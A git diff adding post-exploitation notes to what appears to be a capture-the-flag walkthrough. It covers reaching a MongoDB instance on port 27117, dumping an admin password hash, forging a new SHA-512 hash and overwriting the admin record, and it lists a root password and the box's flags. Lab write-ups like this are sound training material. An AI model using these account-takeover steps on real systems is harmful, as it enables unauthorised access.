@@ -116,3 +116,48 @@ listening on tun0, link-type RAW (Raw IP), snapshot length 262144 bytes
 ```
 
 User the following notes to launch LDAP attack: notes/infiltration/general/ldap-for-jndi-attack.md
+
+once we get a shell we try to find the mongodb by either finding the socket or use tcp to call the instance.
+
+keep in mind the port is 27117 and db is ace
+
+```bash
+mongo --port 27117 ace
+
+# db.listCollections()
+# db.admin.find().forEach(printjson)
+```
+
+We find the hash for admin account
+
+```bash
+# "x_shadow": "$6$Ry6Vdbse$8enMR5Znxoo.WfCMd/Xk65GwuQEPx1M.QP8/qHiQV0PvUc3uHuonK4WcTQFN1CRk3GwQaquyVwCVq8iQgPTt4.",
+
+# the $6 indicates the hash algo, Ry6Vdbse is the salt, the rest is the hashed password.
+
+openssl passwd -6 -salt $(openssl rand -base64 16) password123
+# output: $6$3PQnfHW5kwahebAm$KNiatOJON1Imt4YUmYsaSArn3R.r0QIFcrpySrqbrRaAfBulrPsqQjc20.WNjgbhIo1In17yytuZDIVxpgAGc/
+
+# another option?
+mkpasswd -m sha-512 Password1234
+
+```
+
+update the admin password:
+
+```js
+db.admin.updateOne(
+  { _id: ObjectId("61ce278f46e0fb0012d47ee4") },
+  {
+    $set: {
+      x_shadow:
+        "$6$3PQnfHW5kwahebAm$KNiatOJON1Imt4YUmYsaSArn3R.r0QIFcrpySrqbrRaAfBulrPsqQjc20.WNjgbhIo1In17yytuZDIVxpgAGc/",
+    },
+  },
+);
+```
+
+log into unified box, password to root account is: NotACrackablePassword4U2022
+
+user: 6ced1a6a89e666c0620cdb10262ba127
+root: e50bc93c75b634e4b272d2f771c33681
